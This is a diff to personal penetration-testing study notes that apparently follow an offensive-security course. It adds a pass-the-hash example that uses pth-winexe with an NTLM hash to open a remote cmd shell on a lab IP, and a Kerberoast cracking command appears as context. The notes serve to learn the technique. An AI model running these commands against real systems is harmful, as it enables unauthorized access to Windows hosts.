@@ -2176,6 +2176,15 @@ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <TGS ticketFile>
     Most tools built to exploit PtH create and start a Windows service (for example cmd.exe or an instance of PowerShell) and communicate with it using Named Pipes. This is done using the *Service Control Manager* API. 
     (PWK p657)
     #+end_quote 
+    + src:
+    #+begin_src sh
+    pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2 eb3b9f05c425e //10.11.0.22 cmd 
+      ## pth-winexe -U [DOMAIN/]USERNAME[%PASSWORD]
+    #+end_src
+    #+begin_quote
+    This method works for Active Directory domain accounts and the built-in local administrator account. Since the 2014 security update, this technique can not be used to authenticate as any other local admin account. 
+    #+end_quote
+
 
 * Book4_Chapter 01 An Introduction to TCP/IP
 ** a brief history
